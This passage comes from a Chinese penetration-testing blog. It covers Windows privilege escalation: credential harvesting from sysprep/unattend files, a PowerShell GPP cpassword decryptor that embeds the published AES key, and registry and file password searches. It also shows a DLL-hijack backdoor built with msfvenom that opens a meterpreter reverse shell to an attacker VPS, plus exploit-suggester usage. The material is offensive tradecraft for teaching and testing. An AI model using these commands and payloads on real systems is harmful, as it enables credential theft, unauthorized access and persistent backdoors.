/format:&quot;%var%&quot; &gt;&gt; out.htmlwmic Timezone get DaylightName,Description,StandardName /format:&quot;%var%&quot; &gt;&gt; out.html</code></pre><p><strong>补充：</strong></p><p>使用下面的命令也可获取主机的已经安装的补丁信息</p><pre><code class="hljs">wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre><h2 id="0X02-利用特权提升漏洞直接提权"><a href="#0X02-利用特权提升漏洞直接提权" class="headerlink" title="0X02 利用特权提升漏洞直接提权"></a><strong>0X02 利用特权提升漏洞直接提权</strong></h2><p>这一部分的内容我在我的 <strong>渗透测试小技巧一</strong> 中 写过了，这里就不在赘述</p><h2 id="0X03-在计算机中获取明文或者可解密的密码"><a href="#0X03-在计算机中获取明文或者可解密的密码" class="headerlink" title="0X03 在计算机中获取明文或者可解密的密码"></a><strong>0X03 在计算机中获取明文或者可解密的密码</strong></h2><p>现实的域环境中会有大量的服务器需要配置，作为一个管理员是不可能一台一台的配置的，他们通常会选择自动化安装或者克隆，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码。</p><h3 id="1-使用-Sysprep-exe-批量部署"><a href="#1-使用-Sysprep-exe-批量部署" class="headerlink" title="1.使用 Sysprep.exe 批量部署"></a><strong>1.使用 Sysprep.exe 批量部署</strong></h3><p>为同类计算环境中具有相似硬件配置的基于 Windows 的成千上万台计算机进行部署的企业客户希望能自定义一台计算机，然后将其硬盘（或”映像”）复制到公司的其他计算机上。同样，网络管理员希望在必要时能在时间关键的环境中快速替换计算机。</p><p>单位中的系统管理员通常会预装客户计算机，或物理访问每台客户机以安装操作系统，Sysprep 的设计旨在降低此类任务产生的费用。它使管理员（或第三方集成商）能将单个工作站配置复制到多台客户机，从而大大节约了管理时间和资源。管理员只需做出一组有关计算机设置的假设，从而减少了标准 Windows 安装的开销。</p><p><strong>Sysprep.inf</strong><br>作为建立并部署标准映像的一部分，您可能需要为单个目标计算机自定义少量设置及参数。例如，每个基于 Windows 2000 的计算机需要有唯一的计算机名。”最小安装向导”通常会提示用户保留信息。不过在许多情况下，如果您知道必要信息并且不希望提示用户输入这些信息，则可使用可选的应答文件 Sysprep.inf 实现自动输入。使用 Sysprep.inf 文件，您可让”最小安装向导”只提示某些信息，或创建完全自动的安装。</p><p><strong>最小安装向导</strong><br>计算机第一次从复制磁盘启动时，”最小安装向导”启动。它收集新复制的目标计算机所需的全部信息。如果不使用 Sysprep.inf，则”最小安装向导”显示以下项目：</p><pre><code class="hljs">欢迎Microsoft 许可协议产品 ID区域设置用户名和公司计算机名和管理员密码TAPI 设置（仅适于有调制解调器时）网络配置加入工作组或域（仅适于工作站）服务器许可（仅适于服务器）时区选择完成/重新启动</code></pre><p>也就是说，我们在 sysprep.inf 中指定的信息克隆计算机在安装时就会默认填好，并且不能被更改，那么如果管理员填入了密码的话我们就能通过这个文件获取</p><blockquote><p>当然除了使用 sysprep 这种方式以外，还有与之类似的无人安装的方式，这种方式使用的配置文件是 unattend.txt</p></blockquote><p><strong>通常这些敏感文件会出现在下面目录</strong></p><pre><code class="hljs">c:\sysprep.infc:\sysprep\sysprep.xml%WINDIR%\Panther\Unattend\Unattended.xml%WINDIR%\Panther\Unattended.xml</code></pre><p>这些配置文件极可能包含明文密码，也可能会出现 base64 编码的情况，下面是一些配置文件的事例：</p><pre><code class="hljs"># This is a sample from sysprep.inf with clear-text credentials.[GuiUnattended]OEMSkipRegional=1OemSkipWelcome=1AdminPassword=s3cr3tp4ssw0rdTimeZone=20# This is a sample from sysprep.xml with Base64 &quot;encoded&quot; credentials. Please people Base64 is notencryption, I take more precautions to protect my coffee. The password here is &quot;SuperSecurePassword&quot;.&lt;LocalAccounts&gt;    &lt;LocalAccount wcm:action=&quot;add&quot;&gt;        &lt;Password&gt;            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;            &lt;PlainText&gt;false&lt;/PlainText&gt;        &lt;/Password&gt;        &lt;Description&gt;Local Administrator&lt;/Description&gt;        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;        &lt;Group&gt;Administrators&lt;/Group&gt;        &lt;Name&gt;Administrator&lt;/Name&gt;    &lt;/LocalAccount&gt;&lt;/LocalAccounts&gt;# Sample from Unattended.xml with the same &quot;secure&quot; Base64 encoding.&lt;AutoLogon&gt;    &lt;Password&gt;        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;        &lt;PlainText&gt;false&lt;/PlainText&gt;    &lt;/Password&gt;    &lt;Enabled&gt;true&lt;/Enabled&gt;    &lt;Username&gt;Administrator&lt;/Username&gt;&lt;/AutoLogon&gt;</code></pre><p>关于以上更详细的内容请参看  <a href="https://www.xuebuyuan.com/2082105.html">这篇文章</a></p><h3 id="1-使用-GPP-Group-Policy-Preferences-部署"><a href="#1-使用-GPP-Group-Policy-Preferences-部署" class="headerlink" title="1.使用 GPP(Group Policy Preferences) 部署"></a><strong>1.使用 GPP(Group Policy Preferences) 部署</strong></h3><p>在域中，存在一个默认的共享路径：</p><pre><code class="hljs">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></pre><p>所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等</p><p>例如，测试主机所在域为test.local，可访问共享文件夹\test.local\SYSVOL\test.local，如下图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP1.png" alt="此处输入图片的描述"></p><p>想要批量修改域内主机本地管理员密码，常常通过配置组策略执行vbs脚本的方式</p><p>给出一个修改密码的vbs脚本(实现方式不唯一)，代码如下：</p><pre><code class="hljs">strComputer = &quot;.&quot;Set objUser = GetObject(&quot;WinNT://&quot; &amp; strComputer &amp; &quot;/Administrator, user&quot;)objUser.SetPassword &quot;domain123!&quot;objUser.SetInfo</code></pre><p>这种实现方式，最大的弊端在于修改后的密码会明文保存在vbs脚本中,而该vbs脚本通常会保存在共享文件夹\SYSVOL</p><blockquote><p><strong>这就存在一个隐患:</strong></p><p>任何域用户都能读取该vbs脚本，也就能够获取脚本中保存的明文密码</p></blockquote><p>于是我们还可以通过 GPP（组策略偏好）来进行配置</p><p><strong>开始-管理工具-组策略管理<br>选择域test.local，右键，选中在这个域中创建GPO并在此处链接，如下图</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP2.png" alt="此处输入图片的描述"></p><p><strong>设置名称为test6<br>test6-设置-右键-编辑-用户配置-首选项-控制面板设置-本地用户和组,如下图</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP3.png" alt="此处输入图片的描述"></p><p><strong>更新，administrator(内置),设置密码，如下图</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP4.png" alt="此处输入图片的描述"></p><p><strong>委派，设置权限<br>在详细一栏，可看到该策略对应的ID为{E6424F10-C44B-4C45-8527-740189CBF60E}</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP5.png" alt="此处输入图片的描述"></p><p><strong>至此，组策略配置完成，域内主机重新登录，即可应用此策略，在共享文件夹\SYSVOL中可看到组策略对应ID的文件夹，如下图</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP6.png" alt="此处输入图片的描述"></p><p>由于我们刚刚修改了用户配置下的控制面板，所以在对应的文件夹下能找到配置文件Groups.xml，具体路径如下：</p><pre><code class="hljs">\\test.local\SYSVOL\test.local\Policies\&#123;E6424F10-C44B-4C45-8527-740189CBF60E&#125;\User\Preferences\Groups</code></pre><p><strong>Groups.xml内容如下：</strong></p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; - &lt;Groups clsid=&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;&gt;- &lt;User clsid=&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot; name=&quot;Administrator (内置)&quot; image=&quot;2&quot; changed=&quot;2017-09-25 22:57:53&quot; uid=&quot;&#123;463245FF-08D3-4A28-95E7-42AB416DC508&#125;&quot;&gt;  &lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;0&quot; acctDisabled=&quot;0&quot; subAuthority=&quot;RID_ADMIN&quot; userName=&quot;Administrator (内置)&quot; /&gt;   &lt;/User&gt;  &lt;/Groups&gt;</code></pre><p><strong>值得注意的是其中的cpassword项，保存的是加密后的内容”9XLcz+Caj&#x2F;kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U”<br>加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了该AES 256加密的私钥，地址如下：</strong></p><p><a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx">https://msdn.microsoft.com/en-us/library/cc422924.aspx</a></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP7.png" alt="此处输入图片的描述"></p><p>我们可以借助下面这个项目将明文密码还原</p><p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p><p>该脚本可在域内主机上执行，能够自动查询共享文件夹\SYSVOL中的文件，还原出所有明文密码</p><p><strong>测试如下图</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP8.png" alt="此处输入图片的描述"></p><p>当然，仅仅为了解密cpassword&#x3D;”9XLcz+Caj&#x2F;kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U”，我们可以对以上powershell脚本的功能简化</p><p><strong>简化代码如下：</strong></p><pre><code class="hljs">function Get-DecryptedCpassword &#123;    [CmdletBinding()]    Param (        [string] $Cpassword    )     try &#123;        #Append appropriate padding based on string length          $Mod = ($Cpassword.length % 4)         switch ($Mod) &#123;        &#39;1&#39; &#123;$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)&#125;        &#39;2&#39; &#123;$Cpassword += (&#39;=&#39; * (4 - $Mod))&#125;        &#39;3&#39; &#123;$Cpassword += (&#39;=&#39; * (4 - $Mod))&#125;        &#125;         $Base64Decoded = [Convert]::FromBase64String($Cpassword)         #Create a new AES .NET Crypto Object        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)         #Set IV to all nulls to prevent dynamic generation of IV value        $AesIV = New-Object Byte[]($AesObject.IV.Length)         $AesObject.IV = $AesIV        $AesObject.Key = $AesKey        $DecryptorObject = $AesObject.CreateDecryptor()         [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)         return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)    &#125;     catch &#123;Write-Error $Error[0]&#125;&#125;Get-DecryptedCpassword &quot;9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U&quot;</code></pre><blockquote><p>也就是说：域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹\SYSVOL下，默认所有域内用户可访问，虽然被加密，但很容易被解密</p></blockquote><p>为此，微软发布了补丁KB2962486，下载地址：</p><p><a href="https://technet.microsoft.com/library/security/ms14-025">https://technet.microsoft.com/library/security/ms14-025</a></p><p>系统打了补丁后，组策略中无法设置用户名密码，如下图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP9.png" alt="此处输入图片的描述"></p><p>除了 Groups.xml 以外，其他几个策略首选项文件也可能存在 “cPassword” 属性</p><pre><code class="hljs">Services\Services.xmlhttp://msdn.microsoft.com/en-us/library/cc980070(v=prot.13)ScheduledTasks\ScheduledTasks.xmlhttp://msdn.microsoft.com/en-us/library/cc422920(v=prot.13)http://msdn.microsoft.com/en-us/library/dd341350(v=prot.13)http://msdn.microsoft.com/en-us/library/dd304114(v=prot.13)Printers\Printers.xmlhttp://msdn.microsoft.com/en-us/library/cc422918(v=prot.13)Drives\Drives.xmlhttp://msdn.microsoft.com/en-us/library/cc704598(v=prot.13)DataSources\DataSources.xmlhttp://msdn.microsoft.com/en-us/library/cc422926(v=prot.13)</code></pre><h2 id="0X04-辅助的命令"><a href="#0X04-辅助的命令" class="headerlink" title="0X04 辅助的命令"></a><strong>0X04 辅助的命令</strong></h2><h3 id="1-下面的命令将在文件系统中搜索包含特定关键字的文件名-可以指定任意多的关键字。"><a href="#1-下面的命令将在文件系统中搜索包含特定关键字的文件名-可以指定任意多的关键字。" class="headerlink" title="1.下面的命令将在文件系统中搜索包含特定关键字的文件名,可以指定任意多的关键字。"></a><strong>1.下面的命令将在文件系统中搜索包含特定关键字的文件名,可以指定任意多的关键字。</strong></h3><pre><code class="hljs">C:\Windows\system32&gt; dir /s *pass* == *cred* == *vnc* == *.config*</code></pre><h3 id="2-搜索某些文件类型的关键字"><a href="#2-搜索某些文件类型的关键字" class="headerlink" title="2.搜索某些文件类型的关键字"></a><strong>2.搜索某些文件类型的关键字</strong></h3><pre><code class="hljs">C:\Windows\system32&gt; findstr /si password *.xml *.ini *.txt</code></pre><h3 id="3-下面的两个命令可以用于grep注册表中的关键字，在本例中是“password”。"><a href="#3-下面的两个命令可以用于grep注册表中的关键字，在本例中是“password”。" class="headerlink" title="3.下面的两个命令可以用于grep注册表中的关键字，在本例中是“password”。"></a><strong>3.下面的两个命令可以用于grep注册表中的关键字，在本例中是“password”。</strong></h3><pre><code class="hljs">C:\Windows\system32&gt; reg query HKLM /f password /t REG_SZ /sC:\Windows\system32&gt; reg query HKCU /f password /t REG_SZ /s</code></pre><h2 id="0X05-辅助的工具"><a href="#0X05-辅助的工具" class="headerlink" title="0X05 辅助的工具"></a><strong>0X05 辅助的工具</strong></h2><h3 id="accesschk-exe-来批量检查权限信息"><a href="#accesschk-exe-来批量检查权限信息" class="headerlink" title="accesschk.exe 来批量检查权限信息"></a><strong>accesschk.exe 来批量检查权限信息</strong></h3><p>这个工具来源于工具集 Sysinternals Suite ，感兴趣的可以在<a href="https://download.sysinternals.com/files/SysinternalsSuite.zips://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP9.png">这里</a>下载。该工具的主要作用就是判断用户对于指定文件或者目录下面的所有文件的读写权限（R 是读，W 是写）</p><h4 id="1-查看-d-test-目录下所有文件对每个用户组的权限情况"><a href="#1-查看-d-test-目录下所有文件对每个用户组的权限情况" class="headerlink" title="1.查看 d:&#x2F;test 目录下所有文件对每个用户组的权限情况"></a><strong>1.查看 d:&#x2F;test 目录下所有文件对每个用户组的权限情况</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP10.png" alt="此处输入图片的描述"></p><h4 id="2-查看指定用户组对文件夹下文件的权限"><a href="#2-查看指定用户组对文件夹下文件的权限" class="headerlink" title="2.查看指定用户组对文件夹下文件的权限"></a><strong>2.查看指定用户组对文件夹下文件的权限</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP11.png" alt="此处输入图片的描述"></p><h4 id="3-查看某个用户组对指定服务的权限"><a href="#3-查看某个用户组对指定服务的权限" class="headerlink" title="3.查看某个用户组对指定服务的权限"></a><strong>3.查看某个用户组对指定服务的权限</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP12.png" alt="此处输入图片的描述"></p><h4 id="4-查看对某个用户组有写权限的所有服务"><a href="#4-查看对某个用户组有写权限的所有服务" class="headerlink" title="4.查看对某个用户组有写权限的所有服务"></a><strong>4.查看对某个用户组有写权限的所有服务</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP13.png" alt="此处输入图片的描述"></p><h4 id="5-查看某个用户或用户组对某个注册表项的权限"><a href="#5-查看某个用户或用户组对某个注册表项的权限" class="headerlink" title="5.查看某个用户或用户组对某个注册表项的权限"></a><strong>5.查看某个用户或用户组对某个注册表项的权限</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP14.png" alt="此处输入图片的描述"></p><p>这里 hklm 是 HKEY_LOCAL_MACHINE 的缩写，HKEY_CLASSES_ROOT 的缩写是 hkcr </p><h2 id="0X06-权限维持"><a href="#0X06-权限维持" class="headerlink" title="0X06 权限维持"></a><strong>0X06 权限维持</strong></h2><p>后门是权限维持的必要手段，那么怎么才能安放一个好的后门就非常有技巧，之前我在前面文章中讲过影子账户的创建，感兴趣的同学可以移步 <a href="http://www.k0rz3n.com/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/">这里</a></p><p>当然还有一种更加复杂并且隐蔽的方法：DLL 劫持，这个方法不仅仅在创建后门的时候被经常用到，在 Bypass UAC 的时候也是一种核心的手段</p><h3 id="1-简单的介绍一下"><a href="#1-简单的介绍一下" class="headerlink" title="1.简单的介绍一下"></a><strong>1.简单的介绍一下</strong></h3><p>我们知道，程序在编译的时候往往为了节约空间不会将运行时用到的所有的库都静态编译进 exe 文件中，这样就意味着我们在运行程序的时候程序会去系统中加载需要的动态链接库，这就是我们所说的 DLL (Linux 下的动态链接库是 .so 文件，windows 下是 .dll)。</p><p>系统会有一个寻找 dll 文件的默认顺序，当将恶意的 DLL 文件放到其中一个路径下，并保证该恶意 DLL 先于合法的 DLL 被程序找到时就会发生 DLL 劫持；也可能是程序寻找的 DLL 文件名在系统中并不存在，这时我们只需将自己定制的 DLL 文件放到程序的搜索路径也可以达到目的。</p><p>下面你可以看到在一个 32 位系统中 DLL 的搜索顺序：</p><pre><code class="hljs">1 - 应用加载的目录2 - 32-bit 系统目录(C:\Windows\System32)3 - 16-bit 系统目录 (C:\Windows\System)4 - Windows 目录(C:\Windows)5 - 当前工作目录 (CWD)6 - 环境变量中的目录 (system then user)</code></pre><p>通过上面的搜索路径可以看到第六点环境变量，这也是我们比较容易控制的路径，如果目标装有 python，那么 Path &#x3D; C:\Python27 就是我们可以控制的路径，我们只需要将恶意定制的 DLL 文件放到这个目录就可以。</p><h3 id="2-利用步骤"><a href="#2-利用步骤" class="headerlink" title="2.利用步骤"></a><strong>2.利用步骤</strong></h3><h4 id="1-首先在我的公网-vps-开启-msf-建立监听"><a href="#1-首先在我的公网-vps-开启-msf-建立监听" class="headerlink" title="1.首先在我的公网 vps 开启 msf 建立监听"></a><strong>1.首先在我的公网 vps 开启 msf 建立监听</strong></h4><pre><code class="hljs">msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost xxx.xxx.xxx.xxxlhost =&gt; xxx.xxx.xxx.xxxmsf5 exploit(multi/handler) &gt; set lport 9999lport =&gt; 9999msf5 exploit(multi/handler) &gt; exploit[*] Started reverse TCP handler on xxx.xxx.xxx.xxx:9999 </code></pre><h4 id="2-利用-DllHijackAuditor-工具进行-dll-劫持检测"><a href="#2-利用-DllHijackAuditor-工具进行-dll-劫持检测" class="headerlink" title="2.利用 DllHijackAuditor 工具进行 dll 劫持检测"></a><strong>2.利用 DllHijackAuditor 工具进行 dll 劫持检测</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP16.png" alt="此处输入图片的描述"></p><h4 id="3-在本地的-msf-上生成需要利用的-payload"><a href="#3-在本地的-msf-上生成需要利用的-payload" class="headerlink" title="3.在本地的 msf 上生成需要利用的 payload"></a><strong>3.在本地的 msf 上生成需要利用的 payload</strong></h4><pre><code class="hljs">msf &gt; msfvenom -p windows/meterpreter/reverse_tcp l_host=xxx.xxx.xxx.xxx lport=9999 -f dll -o /root/ext-ms-win-kernel32-package-current-l1-1-0[*] exec: msfvenom -p windows/meterpreter/reverse_tcp l_host=xxx.xxx.xxx.xxx lport=9999 -f dll -o /root/ext-ms-win-kernel32-package-current-l1-1-0[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 341 bytesFinal size of dll file: 5120 bytesSaved as: /root/ext-ms-win-kernel32-package-current-l1-1-0</code></pre><p><strong>然后我将其放在软件相同的目录下，如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP15.png" alt="此处输入图片的描述"></p><h4 id="4-运行后获取-meterpreter-的shell"><a href="#4-运行后获取-meterpreter-的shell" class="headerlink" title="4.运行后获取 meterpreter 的shell"></a><strong>4.运行后获取 meterpreter 的shell</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP17.png" alt="此处输入图片的描述"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/JeYxI2usvJCwmijYEefmOw">https://mp.weixin.qq.com/s/JeYxI2usvJCwmijYEefmOw</a>?<br><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a><br><a href="https://www.freebuf.com/vuls/92016.html">https://www.freebuf.com/vuls/92016.html</a><br><a href="https://www.xuebuyuan.com/2082105.html">https://www.xuebuyuan.com/2082105.html</a><br><a href="https://blog.csdn.net/Fly_hps/article/details/80641585">https://blog.csdn.net/Fly_hps/article/details/80641585</a><br><a href="http://blog.51cto.com/rangercyh/497497">http://blog.51cto.com/rangercyh/497497</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试 技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试小技巧一：寻找EXP</title>
    <link href="/2019/01/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E5%AF%BB%E6%89%BEEXP/"/>
    <url>/2019/01/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E5%AF%BB%E6%89%BEEXP/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言:"></a><strong>0X00 前言:</strong></h2><p>简单总结一下渗透过程中寻找 EXP 的一些方法，还顺便为 windows 下未打的漏洞补丁的寻找写了一个小工具，希望师傅们多多支持！</p><h2 id="0X01-Windows-下寻找可用的-exp"><a href="#0X01-Windows-下寻找可用的-exp" class="headerlink" title="0X01 Windows 下寻找可用的 exp"></a><strong>0X01 Windows 下寻找可用的 exp</strong></h2><h3 id="1-简单的科普："><a href="#1-简单的科普：" class="headerlink" title="1.简单的科普："></a><strong>1.简单的科普：</strong></h3><p>拿到一台 windows 主机，能执行命令了，那么如果想提权的话最好的方式就是利用现有的 exp 直接打，肯定是要使用 systeminfo 这个命令查看系统已打补丁,但是寻找可能存在的特权提升漏洞是一个比较麻烦的过程，我们首先需要知道当前的特权提升洞的 KB 列表，然后再与系统systeminfo 中的 KB 列表进行对比(<strong>KB是微软对补丁的命名方式，是Knowledge Base(知识库)的简称，其指的是某个补丁对应微软知识库中哪一篇文章。例如KB888111，就是对应知识库中888111号文章</strong>)。</p><span id="more"></span><p><strong>可以参考的网站如下：这里面列出了比较新的安全公告</strong></p><blockquote><p><a href="https://docs.microsoft.com/zh-cn/security-updates/">https://docs.microsoft.com/zh-cn/security-updates/</a></p></blockquote><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%AF%BB%E6%89%BE%20exp1.png" alt="此处输入图片的描述"></p><p>MS17-023 对应的补丁就是 KB4014329 ，说明这个来源于 Microsoft 知识库文章 4014329。</p><p>当然这样似乎还是不是很方便查找，于是我又找到了一个文件</p><blockquote><p><strong>链接如下：</strong></p><p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=36982">https://www.microsoft.com/en-us/download/details.aspx?id=36982</a></p></blockquote><p>这个文件整理的比较全了，可以说是网页版的集合</p><p><strong>如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%AF%BB%E6%89%BE%20exp2.png" alt="此处输入图片的描述"></p><p>但是这个文件的冗余还是非常大的，因为特权提升漏洞相对来讲并不是很多，这里面列出的很多代码执行的洞实际上我们并不需要，所以到这一步其实有两种思路，一种就是按照上面的方法写脚本或者怎么样找到补丁列表中有但是系统没有的特权提升补丁，还有一种就是反向思维，找到系统需要更新的补丁，然后反推哪些漏洞存在。</p><h3 id="2-进入正题"><a href="#2-进入正题" class="headerlink" title="2.进入正题"></a><strong>2.进入正题</strong></h3><h4 id="先说思路一："><a href="#先说思路一：" class="headerlink" title="先说思路一："></a><strong>先说思路一：</strong></h4><p>这里不得不提到几个非常好的项目：</p><blockquote><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://github.com/WindowsExploits/Exploits">https://github.com/WindowsExploits/Exploits</a><br><a href="https://github.com/AusJock/Privilege-Escalation">https://github.com/AusJock/Privilege-Escalation</a></p></blockquote><p><strong>方法一：</strong></p><p>重点关注第一个吧，这里面有一个比较好的工具 <strong>win-exp-suggester</strong> 这也是我一直想写的，但是发现人家也已经写了就直接拿来用了，原理就是我上面说的第一种方法，根据上面的那个 xslx 文件中的信息与 systeminfo 进行比较。</p><p><strong>1）首先更新一下数据库</strong></p><pre><code class="hljs">$ python windows-exploit-suggester.py --update[*] initiating winsploit version 3.3...[+] writing to file 2019-01-22-mssb.xls[*] done</code></pre><p><strong>2)安装必要的依赖</strong></p><pre><code class="hljs"> pip install xlrd --upgradeCollecting xlrd  Downloading https://files.pythonhosted.org/packages/b0/16/63576a1a001752e34bf8ea62e367997530dc553b689356b9879339cf45a4/xlrd-1.2.0-py2.py3-none-any.whl (103kB)    100% |████████████████████████████████| 112kB 84kB/sInstalling collected packages: xlrdSuccessfully installed xlrd-1.2.0</code></pre><p><strong>3)将 sysinfo.txt 作为参数传给脚本</strong></p><pre><code class="hljs">$ python windows-exploit-suggester.py --database 2019-01-22-mssb.xls --systeminfo sysinfo.txt[*] initiating winsploit version 3.3...[*] database file detected as xls or xlsx based on extension[*] attempting to read from the systeminfo input file[+] systeminfo input file read successfully (GB2312)[*] querying database file for potential vulnerabilities[*] comparing the 3 hotfix(es) against the 160 potential bulletins(s) with a database of 137 known exploits[*] there are now 160 remaining vulns[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin[+] windows version identified as &#39;Windows 10 64-bit&#39;[*][E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - &#39;win32k.sys&#39; &#39;NtSetWindowLongPtr&#39; Privilege Escalation (MS16-135) (2)[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255</code></pre><p>当然这里面有些实际上是不准确的，因为有些补丁在系统一开始就已经被修复了，于是在 systeminfo 里面不会显示打过这个补丁，但是漏洞实际上并不存在。</p><p><strong>方法二：</strong></p><p>那么除了这个方法以外，我后来还发现了一个网站也能起到类似的作用 <a href="http://blog.neargle.com/win-powerup-exp-indexmyqcloud.com/%E5%AF%BB%E6%89%BE%20exp2.png">传送门</a></p><p><strong>方法三：</strong></p><p>我们可以直接利用 bat 脚本，在收集过可能存在的 KBxxxx 以后使用下面的脚本(收集 KBxxx 其实还是在第一个项目里) ，然后可以使用类似下面的脚本</p><pre><code class="hljs">systeminfo &gt; sysinfo.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904KB3134228 KB3143141 KB3141780 ) do @type sysinfo.txt|@find /i &quot;%i&quot;|| @echo%i you can fuck)&amp;del /f /q /a sysinfo.txt</code></pre><p>这个脚本实际上就是查看 sysinfo 中有没有列出来的这些 KB （当然脚本使用条件就是在可写目录运行）</p><h4 id="再来看思路二"><a href="#再来看思路二" class="headerlink" title="再来看思路二:"></a><strong>再来看思路二:</strong></h4><p>思路二的方法实际上相当于我们使用系统的检查更新的功能，只不过是我么需要在命令行运行罢了，这里要用到 WUA API (Windows Update Agent API) ，官网对应的地址在 <a href="https://docs.microsoft.com/zh-cn/windows/desktop/Wua_Sdk/portal-client">这里</a> ，网上看到有大佬用 C++ 结合 windows 的 COM 组件的方法写的一个 demo ，我觉得简单的优化完善一下就能成为一个比较方便快捷的工具，不仅仅可以用来 hack ，作为正常的检查系统更新情况来讲也是非常不错的。</p><p>我修改完善后的项目放在了我的 github 上，地址如下**（欢迎师傅们提 issue 和 star)**</p><blockquote><p><a href="https://github.com/K0rz3n/PatchesTester">https://github.com/K0rz3n/PatchesTester</a></p></blockquote><p><strong>运行效果图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%AF%BB%E6%89%BE%20exp3.png" alt="此处输入图片的描述"></p><p><strong>结果如下：</strong></p><p><img 